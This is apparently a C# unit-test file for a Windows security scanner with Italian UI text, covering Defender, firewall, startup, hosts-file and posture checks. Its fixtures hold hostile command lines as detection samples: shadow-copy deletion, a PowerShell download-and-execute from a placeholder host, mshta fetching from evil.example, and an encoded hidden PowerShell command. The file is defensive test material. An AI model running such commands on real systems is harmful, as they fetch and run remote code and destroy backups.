using Tramontana.Core;
using Tramontana.Modules.Performance;
using Tramontana.Modules.Protection;
using Tramontana.Modules.Protection.Checks;
using Severity = Tramontana.Modules.Protection.Severity;

namespace Tramontana.Tests;

/// <summary>A context with fakes only: nothing is read from this PC.</summary>
internal static class Fake
{
    public static CheckContext Context(FakeRegistry? registry = null, FakeWmi? wmi = null, FakeCommands? commands = null,
        FakeSignatures? signatures = null, IReadOnlyList<StartupItem>? startup = null, string? profile = null, string? hosts = null,
        SystemEvidence? evidence = null, DateTime? now = null) => new()
    {
        Registry = registry ?? new FakeRegistry(),
        Wmi = wmi ?? new FakeWmi(),
        Commands = commands ?? new FakeCommands(),
        Signatures = signatures ?? new FakeSignatures(),
        Startup = startup ?? [],
        UserProfile = profile ?? KnownPaths.UserProfile,
        HostsFile = hosts ?? Path.Combine(KnownPaths.Temp, "no-hosts-" + Guid.NewGuid().ToString("N")),
        Evidence = evidence,
        Now = now ?? DateTime.Now,
    };

    public static Dictionary<string, object?> Row(params (string, object?)[] values) =>
        values.ToDictionary(v => v.Item1, v => v.Item2, StringComparer.OrdinalIgnoreCase);
}

public class ProtectionFoundationTests
{
    [Fact]
    public void FakeRegistryNormalizesHivesAndListsSubKeys()
    {
        var r = new FakeRegistry().Set(@"HKLM\SOFTWARE\Vendor\App", "Path", @"C:\x").Set(@"HKEY_LOCAL_MACHINE\SOFTWARE\Vendor\Other", "V", 1);
        Assert.Equal(@"C:\x", r.GetString(@"HKEY_LOCAL_MACHINE\SOFTWARE\Vendor\App", "Path"));
        Assert.Equal(1, r.GetInt(@"HKLM\SOFTWARE\Vendor\Other", "V"));
        Assert.Equal(["App", "Other"], r.SubKeys(@"HKLM\SOFTWARE\Vendor").OrderBy(s => s));
        Assert.True(r.KeyExists(@"HKLM\SOFTWARE"));
        Assert.False(r.KeyExists(@"HKLM\SYSTEM"));
    }

    [Fact]
    public void DefencesFindingsComeFromRegistryAndWmi()
    {
        var registry = new FakeRegistry()
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile", "EnableFirewall", 0)
            .Set(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", 0)
            .Set(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", "SmartScreenEnabled", "Off")
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server", "fDenyTSConnections", 0)
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", "UserAuthentication", 0);
        var wmi = new FakeWmi()
            .Add(@"root\SecurityCenter2", "SELECT displayName, productState FROM AntiVirusProduct", Fake.Row(("displayName", "Defender"), ("productState", 0x61000u)))
            .Add(@"root\Microsoft\Windows\Defender", "SELECT AntivirusEnabled, RealTimeProtectionEnabled, AntivirusSignatureAge, QuickScanAge, IsTamperProtected FROM MSFT_MpComputerStatus",
                Fake.Row(("AntivirusEnabled", true), ("RealTimeProtectionEnabled", false), ("AntivirusSignatureAge", 12u), ("QuickScanAge", 40u), ("IsTamperProtected", false)));
        var findings = new DefencesCheck().Run(Fake.Context(registry, wmi)).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Ok, findings["av-Defender"].Severity);
        Assert.Equal(Severity.Danger, findings["defender-realtime"].Severity);
        Assert.Equal(Severity.Warning, findings["defender-signature-age"].Severity);
        Assert.Equal(Severity.Info, findings["defender-scan-age"].Severity);
        Assert.Equal(Severity.Warning, findings["defender-tamper"].Severity);
        Assert.Equal(Severity.Danger, findings["firewall-PublicProfile"].Severity);
        Assert.False(findings.ContainsKey("firewall-StandardProfile"));
        Assert.Equal(Severity.Danger, findings["uac-off"].Severity);
        Assert.Equal(Severity.Warning, findings["smartscreen-off"].Severity);
        Assert.Equal(Severity.Warning, findings["rdp-on"].Severity);
        Assert.All(findings.Values, f => Assert.Equal(Categories.Defences, f.Category));
    }

    [Fact]
    public void StartupAssessorFlagsLolbinsFoldersAndSignatures()
    {
        using var temp = new TempDir();
        string profile = temp.Dir("profile");
        string downloads = temp.Dir(@"profile\Downloads");
        var signatures = new FakeSignatures()
            .With(Path.Combine(downloads, "setup.exe"), SignatureStatus.Unsigned)
            .With(Path.Combine(KnownPaths.RoamingAppData, "upd.exe"), SignatureStatus.Invalid)
            .With(@"C:\Program Files\Vendor\WindowsHelper.exe", SignatureStatus.Signed, "Shady Ltd");
        StartupItem Item(string name, string exe, string command) => new() { Id = name, Name = name, Kind = StartupKind.RunKey, Location = "t", Executable = exe, Command = command };

        var download = StartupAssessor.Assess(Item("a", Path.Combine(downloads, "setup.exe"), "setup.exe"), signatures, profile)!;
        Assert.Equal(Severity.Danger, download.Severity);
        Assert.Contains("temporanea o condivisa", download.Reason);

        var ps = StartupAssessor.Assess(Item("b", Path.Combine(Environment.SystemDirectory, "WindowsPowerShell", "v1.0", "powershell.exe"),
            "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"), signatures, profile)!;
        Assert.Equal(Severity.Danger, ps.Severity);
        Assert.Contains("base64", ps.Reason);
        Assert.Contains("nascosta", ps.Reason);

        var plainScript = StartupAssessor.Assess(Item("c", Path.Combine(Environment.SystemDirectory, "wscript.exe"), @"wscript.exe C:\Tools\sync.vbs"), signatures, profile)!;
        Assert.Equal(Severity.Warning, plainScript.Severity);

        var tampered = StartupAssessor.Assess(Item("d", Path.Combine(KnownPaths.RoamingAppData, "upd.exe"), "upd.exe"), signatures, profile)!;
        Assert.Equal(Severity.Danger, tampered.Severity);
        Assert.Contains("direttamente in", tampered.Reason);

        var impostor = StartupAssessor.Assess(Item("Windows Helper", @"C:\Program Files\Vendor\WindowsHelper.exe", "WindowsHelper.exe"), signatures, profile)!;
        Assert.Equal(Severity.Warning, impostor.Severity);
        Assert.Equal("Shady Ltd", impostor.Publisher);
        Assert.Null(StartupAssessor.Assess(Item("Windows Helper", @"C:\Program Files\Vendor\WindowsHelper.exe", "WindowsHelper.exe"), signatures, profile, ["Shady Ltd"]));

        var fine = StartupAssessor.Assess(Item("e", @"C:\Program Files\Good\good.exe", "good.exe --tray"), signatures, profile);
        Assert.Null(fine);
    }

    [Fact]
    public void CommandLinePatternsCatchRansomwareAndDownloaders()
    {
        Assert.Contains("copie shadow", string.Join(' ', Suspicion.CommandLineReasons("vssadmin.exe delete shadows /all /quiet")));
        Assert.Contains("Scarica codice", string.Join(' ', Suspicion.CommandLineReasons("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/y')\"")));
        Assert.Contains("mshta", string.Join(' ', Suspicion.CommandLineReasons("mshta.exe http://evil.example/a.hta")));
        Assert.Empty(Suspicion.CommandLineReasons("\"C:\\Program Files\\App\\app.exe\" --minimized"));
    }

    [Fact]
    public void HostsAndProxyFindings()
    {
        using var temp = new TempDir();
        // Not named "hosts" and not pointing at Microsoft names: Defender would flag the fixture itself.
        var hosts = temp.Sub("hosts-fixture.txt");
        File.WriteAllText(hosts, "# comment\n127.0.0.1 localhost\n::1 localhost\n0.0.0.0 ads.example # blocked\n93.184.216.34 shop.example.com\n10.0.0.5 flowise.vibe\n");
        var registry = new FakeRegistry()
            .Set(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings", "ProxyEnable", 1)
            .Set(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings", "ProxyServer", "10.0.0.9:8080")
            .Set(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings", "AutoConfigURL", "http://evil.example/proxy.pac");
        var findings = new NetworkConfigCheck().Run(Fake.Context(registry, hosts: hosts)).ToDictionary(f => f.Id);
        Assert.Equal(Severity.Danger, findings["hosts-redirect"].Severity);
        Assert.Contains("93.184.216.34 shop.example.com", findings["hosts-redirect"].Evidence);
        Assert.Equal(Severity.Info, findings["hosts-block"].Severity);
        Assert.Equal(Severity.Warning, findings["proxy-on"].Severity);
        Assert.Equal(Severity.Danger, findings["proxy-pac"].Severity);
        Assert.True(NetworkConfigCheck.LooksPublic("update.microsoft.com"));
        Assert.False(NetworkConfigCheck.LooksPublic("flowise.vibe"));
    }

    [Fact]
    public void ScannerSortsDedupesAndSkipsAdminChecksWithoutEvidence()
    {
        var context = Fake.Context();
        var findings = ProtectionScanner.Run(context,
        [
            new StaticCheck("a", [F("x", Severity.Info), F("y", Severity.Danger)]),
            new StaticCheck("b", [F("x", Severity.Info), F("z", Severity.Warning)]),
            new StaticCheck("c", [F("root", Severity.Danger)], CheckRequirement.Admin),
        ]);
        Assert.Equal(["y", "z", "x"], findings.Select(f => f.Title));
        var trusted = Fake.Context();
        trusted.TrustedPublishers.Add("Trusted Ltd");
        var filtered = ProtectionScanner.Run(trusted, [new StaticCheck("a", [F("w", Severity.Warning, "Trusted Ltd"), F("d", Severity.Danger, "Trusted Ltd")])]);
        Assert.Equal(["d"], filtered.Select(f => f.Title));
    }

    private static Finding F(string key, Severity severity, string? publisher = null) =>
        new(key, Categories.Startup, key, "r", severity) { Publisher = publisher };

    private sealed class StaticCheck(string id, Finding[] findings, CheckRequirement requirement = CheckRequirement.None) : IProtectionCheck
    {
        public string Id => id;
        public string Title => id;
        public CheckRequirement Requirement => requirement;
        public IEnumerable<Finding> Run(CheckContext context) => findings;
    }

    [Fact]
    public void BaselineMarksNewFindingsAfterTheFirstScan()
    {
        using var temp = new TempDir();
        var baseline = new ProtectionBaseline(temp.Sub("baseline.json"));
        var day1 = new DateTime(2026, 1, 1);
        var a = F("a", Severity.Warning);
        var b = F("b", Severity.Warning);
        var ok = F("ok", Severity.Ok);
        var first = baseline.Apply([a], day1);
        Assert.False(first[0].IsNew);
        Assert.Equal(day1, first[0].FirstSeen);
        var second = baseline.Apply([a, b, ok], day1.AddDays(1));
        Assert.Equal([false, true, false], second.Select(f => f.IsNew));
        Assert.Equal(day1, second[0].FirstSeen);
        var fourth = baseline.Apply([a], day1.AddDays(100));
        Assert.True(fourth[0].IsNew);
    }

    [Fact]
    public void ReportListsFindingsByCategory()
    {
        var danger = new Finding("x", Categories.Persistence, "Winlogon Shell", "Avvia explorer.exe e malware.exe", Severity.Danger)
        { Path = @"C:\Users\papa\AppData\Roaming\malware.exe", Evidence = ["Shell = explorer.exe,malware.exe"], IsNew = true };
        var ignored = new Finding("y", Categories.Browser, "Ext", "r", Severity.Warning);
        var text = ProtectionReport.Markdown([danger, ignored], [ignored.Id], new DateTime(2026, 1, 1), "PC di papà");
        Assert.StartsWith("# Rapporto Protezione · PC di papà", text);
        Assert.Contains("- Pericoli: 1", text);
        Assert.Contains("- Ignorati dall'utente: 1", text);
        Assert.Contains("### PERICOLO · nuovo: Winlogon Shell", text);
        Assert.Contains("Shell = explorer.exe,malware.exe", text);
        Assert.DoesNotContain("### Avviso: Ext", text);
    }

    [Fact]
    public void SystemEvidenceSplitsSections()
    {
        var evidence = SystemEvidence.Parse("### a\nline1\nline2\n### b\n\n### c\nx");
        Assert.Equal("line1\nline2", evidence["a"]);
        Assert.Equal("", evidence["b"]);
        Assert.Equal("x", evidence["c"]);
        Assert.Null(evidence["d"]);
    }
}

public class PostureAndDefenderTests
{
    [Fact]
    public void DefenderPoliciesExclusionsAndThreats()
    {
        var registry = new FakeRegistry()
            .Set(@"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1)
            .Set(@"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1);
        var wmi = new FakeWmi()
            .Add(@"root\Microsoft\Windows\Defender", DefenderCheck.PreferencesQuery, Fake.Row(
                ("ExclusionPath", new[] { @"C:\", @"C:\Tools\build" }), ("ExclusionProcess", new[] { "miner.exe" }), ("ExclusionExtension", new[] { ".exe" }),
                ("DisableRealtimeMonitoring", false), ("EnableNetworkProtection", 0u), ("EnableControlledFolderAccess", 0u),
                ("AttackSurfaceReductionRules_Ids", Array.Empty<string>()), ("PUAProtection", 0u)))
            .Add(@"root\Microsoft\Windows\Defender", DefenderCheck.ThreatNamesQuery, Fake.Row(("ThreatID", 2147735503L), ("ThreatName", "Trojan:Win32/Emotet"), ("SeverityID", 5u)))
            .Add(@"root\Microsoft\Windows\Defender", DefenderCheck.ThreatsQuery,
                Fake.Row(("ThreatID", 2147735503L), ("InitialDetectionTime", DateTime.Now.AddDays(-2)), ("Resources", new[] { @"file:_C:\Users\papa\Downloads\fattura.exe" }), ("ActionSuccess", false)),
                Fake.Row(("ThreatID", 2147735503L), ("InitialDetectionTime", DateTime.Now.AddDays(-90)), ("Resources", new[] { @"file:_C:\old.exe" }), ("ActionSuccess", true)));
        var evidence = SystemEvidence.Parse("### defender-exclusions\nPath: C:\\Users\\papa\\AppData\\Local\\Temp\nProcess: miner.exe\n");
        var findings = new DefenderCheck().Run(Fake.Context(registry, wmi, evidence: evidence)).ToList();
        var byId = findings.ToDictionary(f => f.Id);

        Assert.Equal(Severity.Danger, byId["defender-policy|DisableAntiSpyware"].Severity);
        Assert.Equal(FindingAction.RemoveRegistryValue, byId["defender-policy|DisableAntiSpyware"].Action);
        Assert.Equal(Severity.Danger, byId["defender-policy|DisableRealtimeMonitoring"].Severity);
        Assert.Equal(Severity.Danger, byId[@"defender-exclusion|Percorso|C:\"].Severity);
        Assert.Equal(Severity.Warning, byId[@"defender-exclusion|Percorso|C:\Tools\build"].Severity);
        Assert.Equal(Severity.Warning, byId["defender-exclusion|Processo|miner.exe"].Severity);
        Assert.Equal(Severity.Danger, byId["defender-exclusion|Estensione|.exe"].Severity);
        Assert.Equal(Severity.Danger, byId[@"defender-exclusion|Percorso|C:\Users\papa\AppData\Local\Temp"].Severity);
        Assert.Single(findings, f => f.Id == "defender-exclusion|Processo|miner.exe");
        Assert.Equal(Severity.Warning, byId["defender-pua"].Severity);
        Assert.Equal(Severity.Info, byId["defender-asr"].Severity);
        var threat = Assert.Single(findings, f => f.Id.StartsWith("defender-threat|"));
        Assert.Equal(Severity.Danger, threat.Severity);
        Assert.Equal("Defender ha trovato Trojan:Win32/Emotet", threat.Title);
        Assert.Equal(@"C:\Users\papa\Downloads\fattura.exe", threat.Path);
    }

    [Fact]
    public void PostureFindings()
    {
        var registry = new FakeRegistry()
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest", "UseLogonCredential", 1)
            .Set(@"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU", "NoAutoUpdate", 1)
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Services\wuauserv", "Start", 4)
            .Set(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt", 1)
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Services\WinRM", "Start", 2)
            .Set(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "AutoAdminLogon", "1")
            .Set(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultUserName", "papa")
            .Set(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultPassword", "segreta")
            .Set(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList", "support$", 0)
            .Set(@"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell", "ExecutionPolicy", "Bypass")
            .Set(@"HKCU\Software\Microsoft\Office\16.0\Excel\Security", "VBAWarnings", 1);
        var wmi = new FakeWmi()
            .Add(@"root\cimv2", PostureCheck.Smb1Query, Fake.Row(("Name", "SMB1Protocol"), ("InstallState", 1u)))
            .Add(@"root\cimv2", PostureCheck.HotfixQuery, Fake.Row(("HotFixID", "KB1"), ("InstalledOn", DateTime.Now.AddDays(-120).ToString("M/d/yyyy"))))
            .Add(@"root\cimv2", PostureCheck.UsersQuery,
                Fake.Row(("Name", "Guest"), ("Disabled", false), ("SID", "S-1-5-21-1-501"), ("PasswordRequired", false)),
                Fake.Row(("Name", "papa"), ("Disabled", false), ("SID", "S-1-5-21-1-1001"), ("PasswordRequired", true)));
        var commands = new FakeCommands(new(StringComparer.OrdinalIgnoreCase) { ["net.exe localgroup Administrators"] = "Nome alias     Administrators\n\nMembri\n\n-------------------------------------------------------------------------------\nAdministrator\npapa\ntecnico\nEsecuzione comando riuscita.\n" });
        var evidence = SystemEvidence.Parse("### bitlocker\nVolume C: []\n    Stato protezione:                      Protezione disattivata\n");
        var byId = new PostureCheck().Run(Fake.Context(registry, wmi, commands, evidence: evidence)).ToDictionary(f => f.Id);

        Assert.Equal(Severity.Danger, byId["wdigest"].Severity);
        Assert.Equal(Severity.Info, byId["lsa-ppl"].Severity);
        Assert.Equal(Severity.Danger, byId["updates-off"].Severity);
        Assert.Equal(Severity.Danger, byId["updates-service"].Severity);
        Assert.Equal(Severity.Warning, byId["updates-stale"].Severity);
        Assert.Equal(FindingAction.FixSetting, byId["explorer-hidefileext"].Action);
        Assert.Equal(Severity.Info, byId["autoplay"].Severity);
        Assert.Equal(Severity.Danger, byId["smb1"].Severity);
        Assert.Equal(Severity.Warning, byId["winrm"].Severity);
        Assert.Equal(Severity.Warning, byId["guest"].Severity);
        Assert.Equal(Severity.Danger, byId["hidden-account|support$"].Severity);
        Assert.Contains("tecnico", byId["admins"].Title);
        Assert.DoesNotContain("Administrator,", byId["admins"].Title);
        Assert.Equal(Severity.Danger, byId["autologon"].Severity);
        Assert.Equal(Severity.Warning, byId["powershell-policy"].Severity);
        Assert.Equal(Severity.Danger, byId["office-macros|Excel"].Severity);
        Assert.Equal(Severity.Warning, byId["bitlocker"].Severity);
        Assert.True(PostureFixes.CanFix("explorer-hidefileext"));
        Assert.False(PostureFixes.CanFix("wdigest"));
    }

    [Fact]
    public void HealthyPostureIsQuiet()
    {
        var registry = new FakeRegistry()
            .Set(@"HKLM\SYSTEM\CurrentControlSet\Control\Lsa", "RunAsPPL", 2)
            .Set(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt", 0)
            .Set(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers", "DisableAutoplay", 1)
            .Set(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "AutoAdminLogon", "0");
        var findings = new PostureCheck().Run(Fake.Context(registry)).ToList();
        Assert.Empty(findings);
    }
}
